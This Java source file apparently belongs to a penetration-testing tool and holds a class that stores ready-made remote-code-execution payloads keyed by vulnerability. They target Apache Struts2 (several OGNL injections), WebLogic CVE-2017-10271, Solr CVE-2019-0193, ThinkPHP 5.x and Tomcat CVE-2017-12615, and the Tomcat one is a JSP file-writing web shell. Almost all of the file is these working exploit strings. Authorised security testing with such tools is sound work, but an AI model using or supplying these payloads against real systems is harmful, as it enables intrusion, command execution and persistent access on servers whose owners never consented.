package master.tmexp;


import java.util.HashMap;
import java.util.Map;

public class Poc {
    Value_static value_static = new Value_static();
    public  void  add_applist(){
        value_static.app_list.put("Strust2",Strust2());
        value_static.app_list.put("Weblogic",Weblogic());
        value_static.app_list.put("Solr",solr());
        value_static.app_list.put("Think_php",Thinkphp());
        value_static.app_list.put("Tomcat",Tomcat());
        value_static.app_list.put("Shiro",Shiro());
    }
    public static Map<String,String> Strust2(){
        Map <String,String> map=new HashMap<>();
        map.put("strust2_001", "redirect:%24%7B%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%27exp_command%27%7D%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23dis%3Dnew+java.io.DataInputStream%28%23b%29%2C%23buf%3Dnew+byte%5B20000%5D%2C%23dis.read%28%23buf%29%2C%23msg%3Dnew+java.lang.String%28%23buf%29%2C%23dis.close%28%29%2C%23resp.getWriter%28%29.println%28%23msg.trim%28%29%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29%7D");
        map.put("strust2_005", "('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43mycmd\\75\\'whoami\\'')(d))&(h)(('\\43myret\\75@java.lang.Runtime@getRuntime().exec(\\43mycmd)')(d))&(i)(('\\43mydat\\75new\\40java.io.DataInputStream(\\43myret.getInputStream())')(d))&(j)(('\\43myres\\75new\\40byte[51020]')(d))&(k)(('\\43mydat.readFully(\\43myres)')(d))&(l)(('\\43mystr\\75new\\40java.lang.String(\\43myres)')(d))&(m)(('\\43myout\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\\43myout.getWriter().println(\\43mystr)')(d))");
        map.put("strust2_008", "?debug=command&expression=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=id");
        map.put("strust2_009", "/ajax/example5.action?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27\"+command+\"%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]");
        map.put("strust2_012", "%25%7B%23a%3D%28new%20java%2Elang%2EProcessBuilder%28new%20java%2Elang%2EString%5B%5D%7B%22%2Fbin%2Fbash%22%2C%22%2Dc%22%2C%20%22ls%22%7D%29%29%2EredirectErrorStream%28true%29%2Estart%28%29%2C%23b%3D%23a%2EgetInputStream%28%29%2C%23c%3Dnew%20java%2Eio%2EInputStreamReader%28%23b%29%2C%23d%3Dnew%20java%2Eio%2EBufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d%2Eread%28%23e%29%2C%23f%3D%23context%2Eget%28%22com%2Eopensymphony%2Exwork2%2Edispatcher%2EHttpServletResponse%22%29%2C%23f%2EgetWriter%28%29%2Eprintln%28new%20java%2Elang%2EString%28%23e%29%29%2C%23f%2EgetWriter%28%29%2Eflush%28%29%2C%23f%2EgetWriter%28%29%2Eclose%28%29%7D");
        return map;
    }
    public static Map<String,String> Weblogic(){
        Map <String,String> map=new HashMap<>();
        map.put("CVE-2017-10271", """
                <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
                    <soapenv:Header>
                        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                            <java version="1.6.0" class="java.beans.XMLDecoder">
                                <object class="java.lang.ProcessBuilder">
                                    <array class="java.lang.String" length="3">
                                       <void index="0">
                                        <string>/bin/bash</string>
                                    </void>
                                     <void index="1">
                                        <string>-c</string>
                                    </void>
                                     <void index="2">
                                        <string>ls &gt; ./servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/output.txt</string>
                                    </void>
                                    </array>
                                <void method="start"/>
                                </object>
                            </java>
                        </work:WorkContext>
                    </soapenv:Header>
                    <soapenv:Body/>
                </soapenv:Envelope>
                """);
        map.put("CVE-2019-2725", """
                
                """);
        return map;
    }
    public static Map<String,String> solr(){
        Map <String,String> map=new HashMap<>();
        map.put("CVE-2019-0193", "/solr/cleanskies_blog_post/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end");
        return map;
    }
    public static Map<String,String> Thinkphp(){
        Map <String,String> map=new HashMap<>();
        map.put("thinkphp_5x", "/tp5.0.22/public/?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami");
        map.put("thinkphp_5.0.x", "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami\n");
        map.put("thinkphp_5.1.2", "c=system&f=whoami&&_method=filter&");
        return map;
    }
    public static Map<String,String> Tomcat(){
        Map <String,String> map=new HashMap<>();
        // post型的 url上要加上xx.jsp
        map.put("CVE-2017-12615", "<%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.getRealPath(\"/\")+request.getParameter(\"f\"))).write(request.getParameter(\"t\").getBytes());%>");
        return map;
    }
    public  static Map<String,String> Shiro(){
        Map <String,String> map=new HashMap<>();
        return map;
    }
}
